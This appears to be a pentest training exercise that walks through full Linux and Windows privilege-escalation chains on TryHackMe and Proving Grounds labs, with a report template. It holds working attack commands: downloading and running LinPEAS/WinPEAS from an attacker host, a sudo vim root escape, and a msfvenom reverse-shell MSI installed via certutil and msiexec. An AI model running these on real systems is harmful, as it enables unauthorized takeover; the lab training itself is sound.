# Integration — full PrivEsc chain on two boxes

Execute one Linux and one Windows PrivEsc chain end-to-end. Document as if writing a pentest report finding.

## Target options

Linux:
- TryHackMe "Linux PrivEsc" room — https://tryhackme.com/room/linuxprivesc
- OffSec Proving Grounds Practice Easy Linux box — https://www.offsec.com/labs/

Windows:
- TryHackMe "Windows PrivEsc" room — https://tryhackme.com/room/windows10privesc
- OffSec Proving Grounds Practice Easy Windows box

## Linux chain

### Land as low-priv shell

```bash
# Via exploitation from Phase 11, or THM SSH credentials provided
ssh user@<target>
```

### Enumerate

```bash
id && sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab && ls -la /etc/cron*
uname -r && cat /proc/version
```

### Transfer and run LinPEAS

```bash
# Attacker
python3 -m http.server 8080
# Target
wget http://LHOST:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/out.txt
```

### Exploit the finding

Example vector: sudo misconfiguration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
id    # should show root
```

### Confirm root

```bash
id
cat /root/root.txt    # or proof.txt on PG
```

## Windows chain

### Land as low-priv shell

```
Via exploit, web shell, or provided credentials → cmd or PowerShell session
```

### Enumerate

```cmd
whoami /all
systeminfo
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```

### Transfer and run WinPEAS

```cmd
certutil -urlcache -f http://LHOST:8080/winpeas.exe C:\Temp\winpeas.exe
C:\Temp\winpeas.exe
```

### Exploit the finding

Example vector: AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 0x1
```

```bash
# Attacker: generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f msi > evil.msi
# Catch with: nc -lvnp 4444
```

```cmd
# Target
certutil -urlcache -f http://LHOST:8080/evil.msi C:\Temp\evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

### Confirm SYSTEM

```cmd
whoami   # should show NT AUTHORITY\SYSTEM
type C:\Users\Administrator\Desktop\proof.txt
```

## Finding documentation template

Write this for each box:

```
Vulnerability:   [e.g. AlwaysInstallElevated registry misconfiguration]
CVE/Reference:   [HackTricks link or CWE]
Evidence:        [paste the registry query output]
Access gained:   [NT AUTHORITY\SYSTEM]
Impact:          Full system compromise, credential access, lateral movement
Reproduction:    [numbered steps from initial shell to SYSTEM]
Remediation:     [Disable AlwaysInstallElevated via GPO; set both keys to 0]
```

## Self-check

- Can you reproduce each chain in under 30 minutes without notes?
- Can you identify the misconfiguration type without running an automated tool?
- Can you write the finding in a format a client would understand?
- Could you explain the root cause and remediation clearly?

If any answer is no — redo the box, slower, with notes.
